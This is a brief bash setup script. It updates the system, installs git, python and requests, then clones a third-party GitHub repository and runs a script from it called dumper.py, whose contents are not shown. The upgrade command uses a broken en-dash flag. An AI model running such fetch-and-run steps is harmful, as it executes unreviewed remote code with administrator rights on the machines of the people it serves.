#!/bin/bash

apt-get update
apt-get upgrade –y
apt-get install git -y
apt-get install python -y
pip install requests
git clone https://github.com/Sergei1213/home.git
cd home
chmod +x dumper.py
python dumper.py
